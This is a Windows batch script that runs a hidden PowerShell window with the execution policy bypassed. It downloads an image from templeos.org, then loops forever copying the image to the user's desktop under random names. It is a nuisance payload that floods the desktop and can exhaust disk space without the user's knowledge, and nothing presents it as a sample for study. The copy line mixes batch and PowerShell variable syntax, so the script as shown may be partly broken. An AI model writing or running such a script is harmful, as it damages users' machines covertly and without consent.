@echo off
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "curl -o %TEMP%\image.png https://templeos.org/Templeos-header.png"
:terry
powershell cp %TEMP%\image.png $env:%USERPROFILE%\Desktop\%random%image.png
goto terry
